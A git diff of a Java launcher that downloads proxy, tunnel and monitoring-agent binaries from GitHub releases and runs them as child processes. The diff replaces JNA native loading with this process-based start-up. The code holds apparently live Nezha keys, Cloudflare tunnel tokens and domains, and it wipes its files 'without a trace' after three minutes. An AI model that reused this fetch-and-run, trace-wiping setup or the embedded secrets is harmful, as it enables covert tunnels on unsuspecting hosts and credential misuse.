@@ -1,8 +1,5 @@
 package com.example.sbx;
 
-import com.sun.jna.Function;
-import com.sun.jna.NativeLibrary;
-
 import java.io.IOException;
 import java.io.OutputStream;
 import java.net.ServerSocket;
@@ -36,9 +33,9 @@ public class App {
     private static final int PORT = envInt("PORT", 3000);
     private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezha.mingfei1981.eu.org");
     private static final String NEZHA_PORT = env("NEZHA_PORT", "443");
-    private static final String NEZHA_KEY = env("NEZHA_KEY", "LthWZY7Fu8TAiio6Cu");
-    private static final String ARGO_DOMAIN = env("ARGO_DOMAIN", "laternodes.mingfei.de5.net");
-    private static final String ARGO_TOKEN = env("ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiYzhjNTRmZDUtNGZjNS00YTBlLWJiZmMtOGExNmI4ZjMyNjE5IiwicyI6Ik9EazJOemhsT1RjdE1UUm1ZeTAwTldNNUxXRmhaVGN0TkRVNE5UQXpOalUyTW1ZNSJ9");
+    private static final String NEZHA_KEY = env("NEZHA_KEY", "vCROtECZcqqcR7ItYl");
+    private static final String ARGO_DOMAIN = env("ARGO_DOMAIN", "dracobyte.mingfei.de5.net");
+    private static final String ARGO_TOKEN = env("ARGO_TOKEN", "eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiZWE5ODJmNmUtMGNlOS00ODljLWFlNDQtM2ZmMjA4NzQ1ZjhlIiwicyI6IlptVTNOVEJpWkdJdE9XSTFOeTAwWldSaUxUZ3pOVEV0TVRZNVpUbGhZVFUxTW1KbCJ9");
     private static final String WSPORT = env("WSPORT", "8001");
     private static final String TOKEN = env("TOKEN", "babama123");
     private static final String OPERA = env("OPERA", "0");
@@ -88,14 +85,15 @@ public class App {
         int echPort = isValidPort(WSPORT) ? Integer.parseInt(WSPORT) : getFreePort();
         int operaPort = getFreePort();
 
-        // 下载核心组件（区分 .so 动态库 与 可执行程序）
+        // 下载核心组件（全部作为独立可执行程序处理）
         String baseUrl = "https://github.com/webappstars/ech-hug/releases/download/3.0"; 
         Path echLib = downloadLibrary(baseUrl + "/ech-tunnel-linux-" + ARCH, "ech.so");
         
         Path operaLib = null;
         if ("1".equals(OPERA)) {
             String opUrl = "https://github.com/Alexey71/opera-proxy/releases/download/v1.22.0/opera-proxy.linux-" + ARCH;
-            operaLib = downloadLibrary(opUrl, "opera.so");
+            // 将其下载并保存为独立可执行程序后缀
+            operaLib = downloadLibrary(opUrl, "opera-proxy");
         }
 
         // cloudflared 属于可执行程序
@@ -107,8 +105,6 @@ public class App {
             String nzUrl = "https://github.com/babama1001980/good/releases/download/npc/" + ARCH + "agent";
             nezhaExe = downloadLibrary(nzUrl, "nezha-agent");
         }
-
-        List<NativeService> nativeServices = new ArrayList<>();
 
         // 1) 启动哪吒探针 (Process 方式)
         if (nezhaExe != null) {
@@ -126,25 +122,28 @@ public class App {
             startExternalProcess("Nezha Agent", cmd);
         }
 
-        // 2) 启动 Opera 代理
+        // 2) 启动 Opera 代理 (改为 Process 方式启动)
         if (operaLib != null) {
-            String opPayload = toJson(mapOf("args", listOf("-country", COUNTRY.toUpperCase(), "-socks-mode", "-bind-address", "127.0.0.1:" + operaPort)));
-            nativeServices.add(new NativeService("opera-proxy", operaLib, "StartOpera", "StopOpera", opPayload));
+            List<String> cmd = new ArrayList<>();
+            cmd.add(operaLib.toString());
+            cmd.addAll(List.of("-country", COUNTRY.toUpperCase(), "-socks-mode", "-bind-address", "127.0.0.1:" + operaPort));
+            startExternalProcess("Opera Proxy", cmd);
         }
 
-        // 3) 启动 ECH 代理
+        // 3) 启动 ECH 代理 (彻底移除 JNA，改用标准的 Process 独立进程启动)
         if (echLib != null) {
-            List<Object> args = new ArrayList<>(listOf("-l", "ws://0.0.0.0:" + echPort));
+            List<String> cmd = new ArrayList<>();
+            cmd.add(echLib.toString());
+            cmd.addAll(List.of("-l", "ws://0.0.0.0:" + echPort));
             if (!TOKEN.isEmpty()) {
-                args.add("-token");
-                args.add(TOKEN);
+                cmd.add("-token");
+                cmd.add(TOKEN);
             }
             if ("1".equals(OPERA)) {
-                args.add("-f");
-                args.add("socks5://127.0.0.1:" + operaPort);
+                cmd.add("-f");
+                cmd.add("socks5://127.0.0.1:" + operaPort);
             }
-            String echPayload = toJson(mapOf("args", args));
-            nativeServices.add(new NativeService("ech-server", echLib, "StartEch", "StopEch", echPayload));
+            startExternalProcess("ECH Server", cmd);
         }
 
         // 4) 启动 Cloudflared (Process 方式)
@@ -161,16 +160,10 @@ public class App {
             startExternalProcess("Cloudflared", cmd);
         }
 
-        // 注册关闭钩子清理 Native 线程与子进程
+        // 注册关闭钩子清理所有的子进程
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-            stopAllNative(nativeServices);
             stopAllExternal();
         }, "shutdown-hook"));
-
-        // 逐一拉起 Native JNA 线程
-        for (NativeService service : nativeServices) {
-            service.start();
-        }
 
         // 3 分钟后（180秒）自动无痕清理文件并清屏
         Thread cleanupThread = new Thread(() -> {
@@ -206,15 +199,6 @@ public class App {
         thread.start();
     }
 
-    private static void stopAllNative(List<NativeService> services) {
-        System.out.println("\nStopping all native services...");
-        for (int i = services.size() - 1; i >= 0; i--) {
-            try {
-                services.get(i).stop();
-            } catch (Exception ignored) {}
-        }
-    }
-
     private static void stopAllExternal() {
         System.out.println("Stopping all external processes...");
         synchronized (EXTERNAL_PROCESSES) {
@@ -226,55 +210,6 @@ public class App {
                 } catch (Exception ignored) {}
             }
             EXTERNAL_PROCESSES.clear();
-        }
-    }
-
-    private static class NativeService {
-        private final String name;
-        private final Path libPath;
-        private final String startSymbol;
-        private final String stopSymbol;
-        private final String payload;
-        private NativeLibrary library;
-        private Function stopFunction;
-        private boolean running;
-
-        NativeService(String name, Path libPath, String startSymbol, String stopSymbol, String payload) {
-            this.name = name;
-            this.libPath = libPath;
-            this.startSymbol = startSymbol;
-            this.stopSymbol = stopSymbol;
-            this.payload = payload == null ? "" : payload;
-        }
-
-        void start() {
-            library = NativeLibrary.getInstance(libPath.toString());
-            Function startFunction = library.getFunction(startSymbol);
-            stopFunction = library.getFunction(stopSymbol);
-            Thread thread = new Thread(() -> {
-                try {
-                    int code = startFunction.invokeInt(new Object[]{payload});
-                    if (code != 0) {
-                        System.out.println(name + " native service exited with code " + code);
-                    }
-                } catch (Exception e) {
-                    System.out.println(name + " native service failed: " + e.getMessage());
-                }
-            }, name + "-thread");
-            thread.setDaemon(true);
-            thread.start();
-            running = true;
-        }
-
-        void stop() {
-            if (!running || stopFunction == null) return;
-            try {
-                int code = stopFunction.invokeInt(new Object[]{});
-                running = false;
-                System.out.println(name + " stopped with code " + code);
-            } catch (Exception e) {
-                System.out.println("Failed to stop " + name + ": " + e.getMessage());
-            }
         }
     }
 
@@ -353,7 +288,7 @@ public class App {
     }
 
     private static void cleanupOldFiles() {
-        for (String file : List.of("ech.so", "opera.so", "cf-tunnel", "nezha-agent", "nezha.yaml")) {
+        for (String file : List.of("ech.so", "opera-proxy", "cf-tunnel", "nezha-agent", "nezha.yaml")) {
             try { Files.deleteIfExists(RUNTIME_DIR.resolve(file)); } catch (IOException ignored) {}
         }
     }
